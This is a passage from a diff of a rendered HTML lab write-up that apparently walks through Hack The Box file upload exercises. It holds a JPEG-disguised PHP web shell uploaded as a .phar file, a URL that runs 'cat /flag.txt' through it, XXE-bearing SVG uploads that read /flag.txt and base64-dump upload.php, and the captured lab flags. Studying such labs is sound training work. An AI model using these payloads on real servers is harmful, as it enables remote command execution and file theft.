+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a>X-Requested-With: XMLHttpRequest
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a>Content-Type: multipart/form-data; boundary=---------------------------363913493316563598061512274268
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9"></a>Content-Length: 344
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10"></a>Origin: http://94.237.55.28:30732
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11"></a>Connection: keep-alive
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12"></a>Referer: http://94.237.55.28:30732/
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13"></a>
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14"></a>-----------------------------363913493316563598061512274268
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15"></a>Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;mala.gif.phar&quot;
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16"></a>Content-Type: image/jpeg
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17"></a>
+</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18"></a>ÿØÿà JFIF  ` `  ÿþ ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 75
+</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19"></a>&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;   
+</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20"></a>
+</span><span id="__span-8-21"><a id="__codelineno-8-21" name="__codelineno-8-21"></a>-----------------------------363913493316563598061512274268--
+</span></code></pre></div></td></tr></table></div>
+<p>Then, for triggering the execution, we run in the browser:</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>http://94.237.55.28:30732/profile_images/mala.gif.phar?cmd=cat%20/flag.txt
+</span></code></pre></div></td></tr></table></div>
+<p>The output will contain the magic number and the result of the shell command.</p>
+<p>Results: HTB{m461c4l_c0n73n7_3xpl0174710n} </p>
+<h2 id="other-upload-attacks">Other Upload Attacks</h2>
+<p>The above exercise contains an upload functionality that should be secure against arbitrary file uploads. Try to exploit it using one of the attacks shown in this section to read "/flag.txt"</p>
+<p>As only svg files are allowed we will upload the following svg file vulnerable to XXE: </p>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-10-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-10-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-10-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-10-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-10-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-10-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-10-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-10-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-10-10">10</a></span>
+<span class="normal"><a href="#__codelineno-10-11">11</a></span>
+<span class="normal"><a href="#__codelineno-10-12">12</a></span>
+<span class="normal"><a href="#__codelineno-10-13">13</a></span>
+<span class="normal"><a href="#__codelineno-10-14">14</a></span>
+<span class="normal"><a href="#__codelineno-10-15">15</a></span>
+<span class="normal"><a href="#__codelineno-10-16">16</a></span>
+<span class="normal"><a href="#__codelineno-10-17">17</a></span>
+<span class="normal"><a href="#__codelineno-10-18">18</a></span>
+<span class="normal"><a href="#__codelineno-10-19">19</a></span>
+<span class="normal"><a href="#__codelineno-10-20">20</a></span>
+<span class="normal"><a href="#__codelineno-10-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a>POST /upload.php HTTP/1.1
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a>Host: 94.237.59.180:33976
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a>Accept: */*
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7"></a>X-Requested-With: XMLHttpRequest
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8"></a>Content-Type: multipart/form-data; boundary=---------------------------231055308642263431613572836965
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9"></a>Content-Length: 1687
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10"></a>Origin: http://94.237.59.180:33976
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11"></a>Connection: keep-alive
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12"></a>Referer: http://94.237.59.180:33976/
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13"></a>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14"></a>-----------------------------231055308642263431613572836965
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15"></a>Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;icon2.svg&quot;
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16"></a>Content-Type: image/svg+xml
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17"></a>
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19"></a><span class="cp">&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;file:///flag.txt&#39;&gt;</span>]&gt;<span class="p">&lt;</span><span class="nt">svg</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="na">xmlns:xlink</span><span class="o">=</span><span class="s">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="na">aria-hidden</span><span class="o">=</span><span class="s">&quot;true&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;150px&quot;</span> <span class="na">preserveAspectRatio</span><span class="o">=</span><span class="s">&quot;xMidYMid meet&quot;</span> <span class="na">role</span><span class="o">=</span><span class="s">&quot;img&quot;</span> <span class="na">viewBox</span><span class="o">=</span><span class="s">&quot;0 0 24 24&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;150px&quot;</span><span class="p">&gt;&lt;</span><span class="nt">path</span> <span class="na">d</span><span class="o">=</span><span class="s">&quot;M11.996 0a1.119 1.119 0 0 0-.057.003a.9.9 0 0 0-.236.05a.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77V17.556a.889.889 0 0 0 .47.784l9.598 5.541l.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024c.01.001.011.003.016.004a.93.93 0 0 0 .296.015a.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532c0 .15-.08.287-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z&quot;</span> <span class="na">fill</span><span class="o">=</span><span class="s">&quot;#91F108&quot;</span><span class="p">&gt;&lt;</span><span class="nt">item</span><span class="p">&gt;</span><span class="ni">&amp;test;</span><span class="p">&lt;/</span><span class="nt">item</span><span class="p">&gt;&lt;/</span><span class="nt">path</span><span class="p">&gt;&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
+</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20"></a>
+</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21"></a>-----------------------------231055308642263431613572836965--
+</span></code></pre></div></td></tr></table></div>
+<p>Then, look at the source code when uploading the site and you will see the flag.txt file printed:</p>
+<p><img alt="" src="../img/fileupload_02.png" /></p>
+<p>Results: HTB{my_1m4635_4r3_l37h4l}</p>
+<p><strong>Try to read the source code of 'upload.php' to identify the uploads directory, and use its name as the answer. (write it exactly as found in the source, without quotes)</strong></p>
+<p>As retrieving a php file will get the execution of that php file within the application, and therefor it will crash it, we will conduct a XXE attack with a php wrapper that base64 encodes the result. So we upload the following file:</p>
+<div class="language-html highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-11-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-11-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-11-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-11-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-11-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-11-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-11-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-11-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-11-10">10</a></span>
+<span class="normal"><a href="#__codelineno-11-11">11</a></span>
+<span class="normal"><a href="#__codelineno-11-12">12</a></span>
+<span class="normal"><a href="#__codelineno-11-13">13</a></span>
+<span class="normal"><a href="#__codelineno-11-14">14</a></span>
+<span class="normal"><a href="#__codelineno-11-15">15</a></span>
+<span class="normal"><a href="#__codelineno-11-16">16</a></span>
+<span class="normal"><a href="#__codelineno-11-17">17</a></span>
+<span class="normal"><a href="#__codelineno-11-18">18</a></span>
+<span class="normal"><a href="#__codelineno-11-19">19</a></span>
+<span class="normal"><a href="#__codelineno-11-20">20</a></span>
+<span class="normal"><a href="#__codelineno-11-21">21</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>POST /upload.php HTTP/1.1
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>Host: 94.237.59.180:33976
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3"></a>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4"></a>Accept: */*
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5"></a>Accept-Language: en-US,en;q=0.5
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6"></a>Accept-Encoding: gzip, deflate, br
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7"></a>X-Requested-With: XMLHttpRequest
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8"></a>Content-Type: multipart/form-data; boundary=---------------------------231055308642263431613572836965
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9"></a>Content-Length: 1740
+</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10"></a>Origin: http://94.237.59.180:33976
+</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11"></a>Connection: keep-alive
+</span><span id="__span-11-12"><a id="__codelineno-11-12" name="__codelineno-11-12"></a>Referer: http://94.237.59.180:33976/
+</span><span id="__span-11-13"><a id="__codelineno-11-13" name="__codelineno-11-13"></a>
+</span><span id="__span-11-14"><a id="__codelineno-11-14" name="__codelineno-11-14"></a>-----------------------------231055308642263431613572836965
+</span><span id="__span-11-15"><a id="__codelineno-11-15" name="__codelineno-11-15"></a>Content-Disposition: form-data; name=&quot;uploadFile&quot;; filename=&quot;iconic.svg&quot;
+</span><span id="__span-11-16"><a id="__codelineno-11-16" name="__codelineno-11-16"></a>Content-Type: image/svg+xml
+</span><span id="__span-11-17"><a id="__codelineno-11-17" name="__codelineno-11-17"></a>
+</span><span id="__span-11-18"><a id="__codelineno-11-18" name="__codelineno-11-18"></a><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span id="__span-11-19"><a id="__codelineno-11-19" name="__codelineno-11-19"></a><span class="cp">&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM &#39;php://filter/convert.base64-encode/resource=/var/www/html/upload.php&#39;&gt;</span>]&gt;<span class="p">&lt;</span><span class="nt">svg</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="na">xmlns:xlink</span><span class="o">=</span><span class="s">&quot;http://www.w3.org/1999/xlink&quot;</span> <span class="na">aria-hidden</span><span class="o">=</span><span class="s">&quot;true&quot;</span> <span class="na">height</span><span class="o">=</span><span class="s">&quot;150px&quot;</span> <span class="na">preserveAspectRatio</span><span class="o">=</span><span class="s">&quot;xMidYMid meet&quot;</span> <span class="na">role</span><span class="o">=</span><span class="s">&quot;img&quot;</span> <span class="na">viewBox</span><span class="o">=</span><span class="s">&quot;0 0 24 24&quot;</span> <span class="na">width</span><span class="o">=</span><span class="s">&quot;150px&quot;</span><span class="p">&gt;&lt;</span><span class="nt">path</span> <span class="na">d</span><span class="o">=</span><span class="s">&quot;M11.996 0a1.119 1.119 0 0 0-.057.003a.9.9 0 0 0-.236.05a.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77V17.556a.889.889 0 0 0 .47.784l9.598 5.541l.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024c.01.001.011.003.016.004a.93.93 0 0 0 .296.015a.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532c0 .15-.08.287-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z&quot;</span> <span class="na">fill</span><span class="o">=</span><span class="s">&quot;#91F108&quot;</span><span class="p">&gt;&lt;</span><span class="nt">item</span><span class="p">&gt;</span><span class="ni">&amp;test;</span><span class="p">&lt;/</span><span class="nt">item</span><span class="p">&gt;&lt;/</span><span class="nt">path</span><span class="p">&gt;&lt;/</span><span class="nt">svg</span><span class="p">&gt;</span>
+</span><span id="__span-11-20"><a id="__codelineno-11-20" name="__codelineno-11-20"></a>
+</span><span id="__span-11-21"><a id="__codelineno-11-21" name="__codelineno-11-21"></a>-----------------------------231055308642263431613572836965--
+</span></code></pre></div></td></tr></table></div>
+<p>When accessing to the website we can see the upload.php file encoded in base64:</p>
+<p><img alt="" src="../img/file.png" /></p>
+<p>After decoding it, we can submit the response.</p>
+<p>Results: ./images/</p>
+<h2 id="skills-assessment">Skills Assessment</h2>
+<p>ou are contracted to perform a penetration test for a company's e-commerce web application. The web application is in its early stages, so you will only be testing any file upload forms you can find.</p>
+<p>Try to utilize what you learned in this module to understand how the upload form works and how to bypass various validations in place (if any) to gain remote code execution on the back-end server.</p>
+<p><strong>Try to exploit the upload form to read the flag found at the root directory "/".</strong></p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-26T19:15:53+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-26</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-27T20:44:57+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-27</span></small></br>
 
 
     <small>Created: January 26, 2025 19:15:53</small>
